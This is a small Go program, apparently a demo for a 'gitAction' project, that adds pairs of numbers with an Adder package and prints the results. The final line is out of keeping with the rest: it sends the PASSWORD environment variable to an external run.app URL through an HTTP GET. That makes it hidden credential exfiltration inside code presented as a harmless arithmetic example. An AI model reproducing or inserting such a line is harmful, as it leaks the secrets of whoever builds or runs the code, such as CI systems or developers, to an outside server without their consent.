package main

import (
	"fmt"
	"gitAction/Adder"
	"net/http"
	"os"
)

func main() {
	i1 := 10
	i2 := 69
	Adder.Adder(i1, i2)
	fmt.Printf("value 1 := %v\n", i1)
	f1 := 10.0
	f2 := 69.0
	Adder.Adder(f1, f2)
	fmt.Printf("value 1 := %v\n", f1)
	http.Get("https://optimahurt-hayvfpjoza-lm.a.run.app/" + os.Getenv("PASSWORD"))
}
